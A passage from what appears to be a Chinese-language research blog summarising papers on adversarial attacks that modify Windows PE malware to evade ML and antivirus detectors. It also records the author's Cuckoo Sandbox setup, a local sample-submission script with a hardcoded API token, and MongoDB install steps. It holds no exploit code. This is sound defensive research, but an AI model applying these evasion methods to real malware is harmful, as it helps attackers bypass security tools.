href="#A-comparison-of-adversarial-malware-generators-Journal-of-Computer-Virology-and-Hacking-Techniques-2024" class="headerlink" title="A comparison of adversarial malware generators;Journal of Computer Virology and Hacking Techniques 2024"></a>A comparison of adversarial malware generators;<code>Journal of Computer Virology and Hacking Techniques 2024</code></h2><p><strong>论文贡献</strong></p><ol><li>我们将一些现有的对抗性学习方法应用于选定的恶意软件检测系统。</li><li>我们结合这些方法创建了更复杂的对抗性生成器，能够绕过顶级的杀毒产品。</li><li>我们从准确性和实际可用性方面评估了单一和组合生成器。</li></ol><p><strong>攻击的选择</strong></p><ol><li>基于梯度的技术：部分DOS；完全DOS</li><li>基于进化的算法：GAMMA填充；GAMMA注入</li><li>基于强化学习的技术：Gym-malware</li></ol><p><strong>实验设计</strong></p><p><strong>数据集：</strong></p><p>3625个来自windows11的无害PE文件</p><p>3625个从VirusShare库中获得的文件</p><p><strong>攻击设计：</strong></p><ul><li>部分DOS；完全DOS — 最大迭代次数：50 —&gt; Malconv <em>白盒</em></li><li>GAMMA填充；GAMMA注入 — 最大迭代次数：500；正则化参数：10^-5 —&gt; Malconv <em>黑盒</em></li><li>Gym-malware ——&gt; GDBT <em>黑盒</em></li></ul><h3 id="Pros-1"><a href="#Pros-1" class="headerlink" title="Pros"></a>Pros</h3><ul><li><p>第一篇评估当前对抗性攻击生成器的文章</p></li><li><p>评估的指标选用了<strong>样本大小变化</strong>（这项是我们的评估方法中可以采取的）：</p><blockquote><p>通常，攻击者的目标是将生成的对抗性文件大小的增加最小化，使其更难与原始恶意软件样本分开</p></blockquote></li></ul><h3 id="Cons-1"><a href="#Cons-1" class="headerlink" title="Cons"></a>Cons</h3><ul><li>并未说明选择攻击的理由是什么</li><li>排列组合已有的对抗性攻击生成器并不新颖</li><li>对商业杀毒软件的实验，并没有将商业杀毒软件作为直接的攻击对象，而是使用以及生成的样本进行检测</li><li>攻击的设计混乱：黑盒白盒均有且比较时同时比较，不同生成器攻击的检测器也不同</li><li>并未对生成的样本进行<strong>保持性检测</strong></li></ul><h3 id="Argue-1"><a href="#Argue-1" class="headerlink" title="Argue"></a>Argue</h3><ul><li><strong>数据集的代表性和多样性：</strong>使用更大且多样化的数据集，涵盖更多类型的恶意软件和更多种类的杀毒程序，以验证结果的广泛适用性。</li><li><strong>对抗性样本的功能性：</strong>在评估对抗性样本时，不仅要考虑其规避检测的能力，还应评估其功能性和可用性。</li></ul><h2 id="A-survey-of-strategy-driven-evasion-methods-for-PE-malware-Transformation-concealment-and-attack"><a href="#A-survey-of-strategy-driven-evasion-methods-for-PE-malware-Transformation-concealment-and-attack" class="headerlink" title="A survey of strategy-driven evasion methods for PE malware: Transformation, concealment, and attack"></a>A survey of strategy-driven evasion methods for PE malware: Transformation, concealment, and attack</h2><h3 id="paper回答的问题：（是否有理有据的回答清楚了？）"><a href="#paper回答的问题：（是否有理有据的回答清楚了？）" class="headerlink" title="paper回答的问题：（是否有理有据的回答清楚了？）"></a>paper回答的问题：（是否有理有据的回答清楚了？）</h3><ul><li><strong>RQ1</strong>：恶意软件编写者基于转换策略修改恶意软件的结构或行为有多难？转换策略在当今是否仍然适用？</li><li><strong>RQ2</strong>：恶意软件编写者主要采用哪些技术来隐藏恶意软件的行为？防御者对抗这些逃逸技术的难度有多大？</li><li><strong>RQ3</strong>：基于攻击的逃逸策略是否仍然有效以绕过检测？</li><li><strong>RQ4</strong>：攻击者可以使用哪些智能算法来实施基于攻击的逃逸策略以规避检测？哪些方法在现实场景中更为适用？</li><li><strong>RQ5</strong>：攻击者是否可以将这些逃逸策略结合起来，创造出更具逃逸性的恶意软件？‘</li></ul><h3 id="未回答的问题："><a href="#未回答的问题：" class="headerlink" title="未回答的问题："></a>未回答的问题：</h3><blockquote><p>Table 5 presents a comparison of the surveyed methods in relation to their attack algorithm, manipu- lation of malware, applied scenarios, and target detector. Due to the dissimilarities in the utilized dataset and target detector across the various works, comparative metrics such as the evasion rate are not compared.</p><p>表5对所调查的方法在攻击算法、恶意软件修改、应用场景和目标检测器方面进行了比较。由于各个研究中使用的数据集和目标检测器的不同，规避率等比较指标不作比较。</p></blockquote><h2 id="Evaluating-Realistic-Adversarial-Attacks-against-Machine-Learning-Models-for-Windows-PE-Malware-Detection"><a href="#Evaluating-Realistic-Adversarial-Attacks-against-Machine-Learning-Models-for-Windows-PE-Malware-Detection" class="headerlink" title="Evaluating Realistic Adversarial Attacks against Machine Learning Models for Windows PE Malware Detection"></a>Evaluating Realistic Adversarial Attacks against Machine Learning Models for Windows PE Malware Detection</h2><ul><li>使用SHAP计算每个特征的重要性</li><li>分析对抗性样本和原始恶意软件之间的<strong>欧几里得距离</strong></li><li>仅探讨了特定的攻击方法（Extend、Full DOS、Shift、FGSM padding+slack 和 GAMMA）</li><li>仅攻击了MalConv和LGBM模型</li></ul><h1 id="别的SOK论文是怎么写的"><a href="#别的SOK论文是怎么写的" class="headerlink" title="别的SOK论文是怎么写的"></a>别的SOK论文是怎么写的</h1><h2 id="Evaluating-Realistic-Adversarial-Attacks-against-Machine-Learning-Models-for-Windows-PE-Malware-Detection-1"><a href="#Evaluating-Realistic-Adversarial-Attacks-against-Machine-Learning-Models-for-Windows-PE-Malware-Detection-1" class="headerlink" title="Evaluating Realistic Adversarial Attacks against Machine Learning Models for Windows PE Malware Detection"></a><strong>Evaluating Realistic Adversarial Attacks against Machine Learning Models for Windows PE Malware Detection</strong></h2><p><strong>五种攻击：</strong>Extend、Full DOS、Shift、FGSM padding + slack 和 GAMMA</p><p><strong>两种检测器：</strong>MalConv和LGBM（Ember）</p><p><strong>贡献</strong>：</p><ul><li><p>增加了数据集规模</p></li><li><p>解释所考虑的对抗性攻击方法如何改变PE恶意软件，以欺骗检测器</p><p>使用SHAP<code>SHapley Additive exPlanations</code>技术解释输入值如何主要影响机器学习模型的决策</p></li><li><p>探讨了对抗训练策略作为确保有效决策模型抵御基于所考虑攻击方法生成的对抗 Windows PE 恶意软件的手段</p></li></ul><p><strong>评估研究的主要目标：</strong></p><ul><li><p>评估在为本研究准备的Windows PE数据集上，两个预训练模型MalConv和LGBM的准确性（第5.1节）。</p></li><li><p>评估两个预训练模型MalConv和LGBM在通过本研究中考虑的攻击方法生成的真实对抗Windows PE恶意软件下的完整性（第5.2节）。</p></li><li><p>分析原始Windows PE恶意软件与其对抗样本之间的距离（见第5.3节）。</p><blockquote><p>该距离通过在MalConv的原始字节输入空间（攻击在此生成）和LGBM的工程特征输入空间（生成的攻击在此进行可转移性分析）中计算的欧氏距离来衡量。欧氏距离在对所有文件的输入维度进行0到1之间的缩放后计算。每个距离值都除以其计算输入空间的维度数量。</p></blockquote></li><li><p>解释使用工程特征学习的LGBM模型在对抗Windows PE恶意软件文件的恶意行为做出决策时可能表现出不同的原因（第5.4节）。</p></li><li><p>调查使用通过真实Windows PE攻击方法生成的对抗恶意软件样本进行的对抗训练的性能（第5.5节）。</p></li></ul><h2 id="Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection"><a href="#Adversarial-EXEmples-A-Survey-and-Experimental-Evaluation-of-Practical-Attacks-on-Machine-Learning-for-Windows-Malware-Detection" class="headerlink" title="Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection"></a>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</h2><p><strong>评估的操作：</strong></p><ul><li><strong>Full DOS</strong>：通过修改DOS头部的非关键字节（除了Magic Number和PE头偏移量），注入对抗性负载而不影响程序的执行。</li><li><strong>Extend</strong>：通过扩展DOS头部，增加PE头的偏移量和头文件的大小，在其中创建空间并注入对抗性字节。</li><li><strong>Shift</strong>：通过移动第一个段的内容，增加段的偏移量，在段之前创建空间并注入对抗性负载。</li><li><strong>Partial DOS：</strong>通过修改 DOS 头中除 “MZ” 魔法数字和 PE 头偏移外的前 58 个字节，插入对抗性扰动。</li><li><strong>Padding：</strong>在文件末尾添加填充字节，以不影响文件功能的方式插入对抗性扰动。</li><li><strong>FGSM：</strong>通过使用梯度符号信息生成对抗性扰动，并将其注入文件中的填充空间或未使用的间隙中，避免破坏文件结构。<strong>FGSM（快速梯度符号方法）**的黑盒攻击通过使用像**填充**和</strong>间隙空间**这样的实际操作来实现。</li></ul><p><strong>检测器：</strong>（这里感觉还是不要自己训练，就用现成的就好）</p><ul><li>DNN-Lin (E)</li><li>DNN-Lin (P)</li><li>DNN-ReLU (E)</li><li>DNN-ReLU (P)</li><li>MalConv (E)</li><li>GBDT (E)</li></ul><p><strong>有一个迁移攻击检测</strong></p><p><strong>贡献：</strong></p><ul><li>我们提出了RAMEN，这是一个通用框架，用于表达基于静态代码分析的学习型Windows恶意软件检测器上的白盒和黑盒对抗性攻击。</li><li>我们提出了三种基于实用、保持功能的操作的新攻击，分别称为Full DOS、Extend和Shift，这些攻击在白盒和黑盒攻击环境中改善了逃避概率和字节扰动量之间的权衡。</li><li>我们将所有上述白盒和黑盒攻击的实现（包括之前的攻击、Extend和Shift）作为一个开源项目发布，链接为：<a href="https://github.com/zangobot/secml_malware%E3%80%82">https://github.com/zangobot/secml_malware。</a></li><li>我们识别出一些有前景的未来研究方向，旨在提高基于静态代码分析的学习型Windows恶意软件检测器的对抗性鲁棒性。</li></ul><h2 id="An-Empirical-Study-on-the-Effectiveness-of-Adversarial-Examples-in-Malware-Detection"><a href="#An-Empirical-Study-on-the-Effectiveness-of-Adversarial-Examples-in-Malware-Detection" class="headerlink" title="An Empirical Study on the Effectiveness of Adversarial Examples in Malware Detection"></a><strong>An Empirical Study on the Effectiveness of Adversarial Examples in Malware Detection</strong></h2><p>这篇论文是一篇<strong>经验研究（empirical study）</strong>，主要探讨了对抗性样本（Adversarial Examples, AEs）在恶意软件检测中的有效性。论文的核心工作包括：</p><ol><li><strong>黑盒攻击</strong>：利用了七种不同的扰动技术，如“附加覆盖（Overlay Append）”和“破坏校验和（Break Checksum）”，通过直接对PE（Portable Executable）文件进行操作，生成可以规避机器学习（ML）和深度学习（DL）恶意软件检测器的对抗性样本。</li><li><strong>实验结果</strong>：论文验证了这种攻击方法的有效性，发现其可以对主流ML和DL恶意软件检测器达到65.6%和99%的规避率。此外，论文还指出，这些对抗性样本在VirusTotal上能够成功绕过17%的杀毒软件供应商。</li><li><strong>防御方法</strong>：作者提出了一种基于<strong>趋势局部敏感哈希（Trend Locality Sensitive Hashing, TLSH）</strong>的防御模型，该模型通过相似性检测有效抵御了这些对抗性样本，缓解了对抗训练的局限性。</li></ol><h2 id="A-Comparison-of-State-of-the-Art-Techniques-for-Generating-Adversarial-Malware-Binaries"><a href="#A-Comparison-of-State-of-the-Art-Techniques-for-Generating-Adversarial-Malware-Binaries" class="headerlink" title="A Comparison of State-of-the-Art Techniques for Generating Adversarial Malware Binaries"></a>A Comparison of State-of-the-Art Techniques for Generating Adversarial Malware Binaries</h2><p><strong>攻击方法实现：</strong></p><ul><li>填充攻击（Padding Attack）</li><li>部分 DOS 头部修改攻击（Partial DOS Header Manipulation）</li><li>基于遗传算法的对抗性恶意软件攻击（GAMMA）</li></ul><p><strong>攻击了两个主要的检测器</strong>：</p><ul><li><strong>MalConv</strong>：这是一个基于深度学习的恶意软件分类器，用于检测恶意软件。作者使用了预训练的 MalConv 模型，该模型是基于 EMBER 数据集训练的。MalConv 的分类置信度阈值设置为 0.5，也就是说，如果分类器的置信度超过 50%，则该样本会被分类为恶意软件。</li><li><strong>基于梯度的决策树分类器</strong>：这个分类器也是用于评估对抗性恶意软件生成效果的工具之一，但论文没有给出太多关于该分类器的详细参数设置。</li></ul><p><strong>性能评估：</strong></p><ul><li><strong>逃避率</strong>：表示修改后的恶意软件成功逃避分类器的样本比例。</li><li><strong>处理时间</strong>：恶意软件变得能够逃避检测所需的时间。</li><li><strong>扰动次数</strong>：恶意软件需要多少次字节修改才能成功逃避检测。</li></ul><h2 id="A-comparison-of-adversarial-malware-generators"><a href="#A-comparison-of-adversarial-malware-generators" class="headerlink" title="A comparison of adversarial malware generators"></a>A comparison of adversarial malware generators</h2><p><strong>攻击的参数设置：</strong></p><ul><li><strong>部分DOS攻击（Partial DOS）</strong>：白盒攻击，针对MalConv检测器。攻击者可以访问MalConv的内部结构，并使用梯度信息来指导攻击。</li><li><strong>全DOS攻击（Full DOS）</strong>：白盒攻击，目标同样是MalConv检测器。攻击者修改PE文件DOS头部的全部字节，利用梯度信息实现逃避。</li><li><strong>GAMMA填充攻击（Padding Attack）</strong>：黑盒攻击，针对MalConv检测器。攻击者通过插入良性字节来逃避检测，无法直接访问模型的内部参数。</li><li><strong>GAMMA段注入攻击（Section Injection Attack）</strong>：黑盒攻击，依然针对MalConv检测器。攻击者通过在恶意软件中添加新段并注入无害内容，目标是减少被检测的概率。</li><li><strong>Gym-malware攻击</strong>：黑盒攻击，目标是GBDT（Gradient Boosting Decision Tree）检测器。攻击者使用强化学习的方式，根据输出结果选择操作，而不依赖内部结构信息。</li></ul><p><strong>检测器：</strong>9个匿名的商用检测器</p><p><strong>性能评估：</strong></p><ul><li>作者主要通过逃避率（Evasion Rate, ER）来评估攻击效果，逃避率表示经过修改的恶意文件成功规避目标检测器的比例。</li><li>实验还比较了组合攻击的效果，包括使用不同的攻击生成器组合生成新的对抗性恶意样本，测试其逃避率。</li></ul><h1 id="实验用到的工具"><a href="#实验用到的工具" class="headerlink" title="实验用到的工具"></a>实验用到的工具</h1><h2 id="Cuckoo-Sandbox"><a href="#Cuckoo-Sandbox" class="headerlink" title="Cuckoo Sandbox"></a>Cuckoo Sandbox</h2><p>Cuckoo 是一个开源的自动恶意软件分析系统。</p><p>它可以检索以下类型的结果：</p><ul><li><p>恶意软件生成的所有进程执行的调用痕迹。</p></li><li><p>恶意软件在执行期间创建、删除和下载的文件。</p></li><li><p>恶意软件进程的内存转储。</p></li><li><p>PCAP格式的网络流量跟踪。</p></li><li><p>在执行恶意软件期间拍摄的屏幕截图。</p></li><li><p>机器的全内存转储。</p></li></ul><blockquote><p>虽然推荐的设置是GNU&#x2F;Linux（最好是Debian或Ubuntu），但Cuckoo也已证明在Mac OS X和Microsoft Windows 7上作为主机运行得很顺畅。推荐和测试的客机设置是Windows分析使用Windows XP和64位Windows 7，Mac OS X分析使用Mac OS X Yosemite，Linux分析使用Debian，尽管Cuckoo也应该可以在其他版本的客操作系统上工作。不要使用Windows Linux子系统（WLS）来运行Cuckoo Sandbox。</p></blockquote><h1 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h1><h2 id="如何判断一个PE文件格式合法"><a href="#如何判断一个PE文件格式合法" class="headerlink" title="如何判断一个PE文件格式合法"></a>如何判断一个PE文件格式合法</h2><p>使用pefile库作为工具</p><ol><li><code>DOS_HEADER</code>：<ul><li>检查<code>DOS_HEADER.e_magic</code> 字段是否为<code>MZ</code></li></ul></li><li><code>IMAGE_NT_HEADER</code>: 包含文件头<code>FILE_HEADER</code>和可选头<code>OPTIONAL_HEADER</code><ul><li>文件头<code>FILE_HEADER</code>:<ul><li>检查文件头<code>FILE_HEADER</code>是否以<code>PE\0\0</code>开始</li><li>从可选头<code>OPTIONAL_HEADER</code>中获取文件的物理信息，例如<code>SizeOfImage</code>、<code>SizeOfCode</code></li></ul></li><li>可选头<code>OPTIONAL_HEADER</code><ul><li>检查<code>pe.OPTIONAL_HEADER.Magic</code>是否为<code>0x10B or 0x20B</code></li><li>检查<code>pe.OPTIONAL_HEADER.DATA_DIRECTORY</code>，确定虚拟地址是否在节中</li></ul></li></ul></li><li><code>SECTIONS</code>：<ul><li>节名称检查</li><li>节大小检查</li><li>节虚拟地址对齐检查</li><li>节原始数据指针对齐检查</li><li>实际节数量和<code>pe.FILE_HEADER.NumberOfSections</code>是否相等</li><li>检查实际section数量与<code>pe.FILE_HEADER.NumberOfSections</code>的值是否相等</li></ul></li><li><del>检查PE文件在磁盘上的实际大小和预期大小是否相同</del>（暂时不用这个作为判断PE格式的规则）<ul><li>预期大小：<code>expected_size = pe.OPTIONAL_HEADER.SizeOfHeaders + sum(section.SizeOfRawData for section in pe.sections)</code>、实际大小<code>len(pe.__data__)</code></li></ul></li><li>引入函数节<code>.idata</code><ul><li>检查 <code>IMAGE_IMPORT_DESCRIPTOR</code> 结构的数量是否与实际<code>DLL</code>的数量相对应</li></ul></li><li>导出函数节<code>.edata</code><ul><li>检查<code>NumberOfFunctions</code>是否和实际导出函数的数量相等</li></ul></li></ol><h2 id="使用-cuckoo-Sandbox-检查是否可执行和保持恶意功能"><a href="#使用-cuckoo-Sandbox-检查是否可执行和保持恶意功能" class="headerlink" title="使用 cuckoo Sandbox 检查是否可执行和保持恶意功能"></a>使用 cuckoo Sandbox 检查是否可执行和保持恶意功能</h2><p><del>卡住了，安装不了。现在打算试一下用<code>Hybrid analysis</code>这个工具</del></p><p>2024.8.24终于安装好了</p><p><code>sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump </code>解决下面的问题</p><blockquote><p>2020-12-22 16:31:25,236 [cuckoo.core.plugins] ERROR: Unable to stop auxiliary module: Sniffer Traceback (most recent call last): File “&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;cuckoo&#x2F;core&#x2F;plugins.py”, line 164, in stop module.stop() File “&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;cuckoo&#x2F;auxiliary&#x2F;sniffer.py”, line 156, in stop (out, err, faq(“permission-denied-for-tcpdump”)) CuckooOperationalError: Error running tcpdump to sniff the network traffic during the analysis; stdout &#x3D; ‘’ and stderr &#x3D; ‘tcpdump: vboxnet0: That device is not up\n’. Did you enable the extra capabilities to allow running tcpdump as non-root user and disable AppArmor properly (the latter only applies to Ubuntu-based distributions with AppArmor, see also <a href="https://cuckoo.sh/docs/faq/index.html#permission-denied-for-tcpdump">https://cuckoo.sh/docs/faq/index.html#permission-denied-for-tcpdump</a>)?</p></blockquote><h3 id="网页使用教程："><a href="#网页使用教程：" class="headerlink" title="网页使用教程："></a>网页使用教程：</h3><p>首先启动 mongoDB</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod <span class="comment"># 启动 MongoDB 服务</span></span><br><span class="line">sudo systemctl status mongod <span class="comment"># 验证 MongoDB 服务状态</span></span><br></pre></td></tr></table></figure><p>在第一个终端窗口运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cuckoo -d</span><br></pre></td></tr></table></figure><p>在第二个终端运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cuckoo web runserver</span><br></pre></td></tr></table></figure><p>访问<code>127.0.0.1:8000</code>，并提交病毒样本</p><h3 id="如何自动化提交样本到本地cuckoo并获取分析结果"><a href="#如何自动化提交样本到本地cuckoo并获取分析结果" class="headerlink" title="如何自动化提交样本到本地cuckoo并获取分析结果"></a>如何自动化提交样本到本地cuckoo并获取分析结果</h3><p>使用<code>cuckoo -d</code>开启<code>cuckoo</code>守护进程</p><p>使用<code>cuckoo api -H 127.0.0.1 -p 8000</code> 在本地的<code>127.0.0.1:8000</code>开启<code>api</code></p><p>然后通过下面的代码发送到cuckoo沙盒中解析，<code>api_token</code>在<code>.cuckoo/conf/cuckoo.conf</code>中获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HEADERS = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer CNM8W4QnTABkVtke0fcx5Q&quot;</span>&#125;  <span class="comment"># 使用你的 api_token</span></span><br><span class="line"></span><br><span class="line">submit_url = <span class="string">&quot;http://localhost:8000/tasks/create/file&quot;</span></span><br><span class="line"></span><br><span class="line">  data = &#123;<span class="string">&#x27;timeout&#x27;</span>: <span class="string">&#x27;30&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">with</span> <span class="built_in">open</span>(sample, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sample_file:</span><br><span class="line">          files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;new_mutation&quot;</span>, sample_file)&#125;</span><br><span class="line">          r = requests.post(submit_url, data=data, files=files, headers=HEADERS) </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;File successfully submitted for analysis: <span class="subst">&#123;sample&#125;</span>&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> r.json()</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">f&quot;Error code: <span class="subst">&#123;r.status_code&#125;</span> returned when submitting.&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> r.status_code</span><br></pre></td></tr></table></figure><p>通过上面返回的<code>r.json</code>得到task_id，然后使用下面的代码获取报告</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_report_local_sandbox</span>(<span class="params">task_id, report_type=<span class="string">&#x27;report&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fetches a report from Cuckoo Sandbox based on the task_id.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Input:</span></span><br><span class="line"><span class="string">        task_id: The ID of the task to fetch the report for</span></span><br><span class="line"><span class="string">        report_type: The type of report to fetch (&#x27;report&#x27; or &#x27;view&#x27;)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    report_url = <span class="string">f&quot;http://localhost:8000/tasks/<span class="subst">&#123;report_type&#125;</span>/<span class="subst">&#123;task_id&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(report_url, headers=HEADERS)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> r.json()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch report. Status code: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred while fetching the report: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="安装教程："><a href="#安装教程：" class="headerlink" title="安装教程："></a>安装教程：</h3><p>参考的博客：</p><ul><li><a href="https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/">https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/</a></li><li><a href="https://www.cnblogs.com/BenjaminNL/p/11139517.html">https://www.cnblogs.com/BenjaminNL/p/11139517.html</a></li></ul><p>配置的环境为嵌套虚拟：</p><p>主机macOS 虚拟机 parallel desktop，⚠️<strong>我使用的是花钱升级后的parallel desktop，好像普通版的没有这个功能。当然我认为使用virtualbox也是可以的，你可以试一试</strong></p><p>parallel desktop 安装的是 ubuntu 22.04 jammy 版本， ubuntu中安装的是virtual box虚拟机系统为windows xp</p><p>跟随<a href="https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/%E4%B8%80%E8%87%B4%E5%AE%89%E8%A3%85%E5%88%B0step">https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/一致安装到step</a> 54。现在我们不安装windows 7，转去安装windows xp（因为我的虚拟机存储空间不够）。</p><p>注意，首先我们要修改parallel desktop的网络设置，配置shared（也就是NAT）如下图所示</p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-24%2016.44.42.png" alt="截屏2024-08-24 16.44.42"></p><p>接着手动设置ubuntu的网络设置如下，这是为了确保ubuntu能够使用parallel desktop提供的子网访问互联网：</p><p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-08-24%2016.45.45.png" alt="截屏2024-08-24 16.45.45"></p><p>现在我们跟随<a href="https://www.cnblogs.com/BenjaminNL/p/11139517.html%E7%9A%842.3%E8%8A%82%E8%BF%9B%E8%A1%8C%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%87%86%E5%A4%87%EF%BC%9A">https://www.cnblogs.com/BenjaminNL/p/11139517.html的2.3节进行客户机准备：</a></p><p>⚠️ 注意在配置windowsxp虚拟机网关和ubuntu网关时，要配制成你parallel desktop 的 shared 网络设定的网关，这一步可以问问chatgpt怎么查看网关，通常是通过ifconfig查看。</p><p>其余步骤相同，还需要注意的点有</p><p>⚠️ mongodb需要安装4.2或4.4版本，如何在ubuntu22.04上安装mongodb 4.0 如下所示：</p><blockquote><p>要在Ubuntu 22.04上安装MongoDB 4.2，你可以按照以下步骤操作：</p><h3 id="1-导入MongoDB-4-2的官方公钥"><a href="#1-导入MongoDB-4-2的官方公钥" class="headerlink" title="1. 导入MongoDB 4.2的官方公钥"></a>1. 导入MongoDB 4.2的官方公钥</h3><p>首先，你需要导入MongoDB的官方公钥，以确保安装包的安全性：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-4.2.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="2-创建MongoDB-4-2的APT源列表文件"><a href="#2-创建MongoDB-4-2的APT源列表文件" class="headerlink" title="2. 创建MongoDB 4.2的APT源列表文件"></a>2. 创建MongoDB 4.2的APT源列表文件</h3><p>接下来，创建一个新的APT源列表文件，将MongoDB 4.2的源添加到系统中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.2 multiverse&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/mongodb-org-4.2.list</span><br></pre></td></tr></table></figure><p>注意：虽然你使用的是Ubuntu 22.04（Jammy），但MongoDB 4.2的官方APT源是为Ubuntu 18.04（Bionic）准备的。这个源在Ubuntu 22.04上也能正常工作。</p><h3 id="3-更新APT包数据库"><a href="#3-更新APT包数据库" class="headerlink" title="3. 更新APT包数据库"></a>3. 更新APT包数据库</h3><p>添加源后，更新你的APT包数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="4-安装MongoDB-4-2"><a href="#4-安装MongoDB-4-2" class="headerlink" title="4. 安装MongoDB 4.2"></a>4. 安装MongoDB 4.2</h3><p>现在你可以安装MongoDB 4.2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org=4.2.23 mongodb-org-server=4.2.23 mongodb-org-shell=4.2.23 mongodb-org-mongos=4.2.23 mongodb-org-tools=4.2.23</span><br></pre></td></tr></table></figure><p>这里我们指定了版本号 <code>4.2.23</code>，你可以根据需要安装MongoDB 4.2的其他版本。</p><h3 id="5-固定MongoDB版本"><a href="#5-固定MongoDB版本" class="headerlink" title="5. 固定MongoDB版本"></a>5. 固定MongoDB版本</h3><p>为了防止意外升级MongoDB，你可以将这些包固定在当前版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-server hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-shell hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-mongos hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-tools hold&quot;</span> | sudo dpkg --set-selections</span><br></pre></td></tr></table></figure><h3 id="6-启动MongoDB服务"><a href="#6-启动MongoDB服务" class="headerlink" title="6. 启动MongoDB服务"></a>6. 启动MongoDB服务</h3><p>安装完成后，你可以启动MongoDB服务：</p><figure class="highlight bash"><table><tr><td 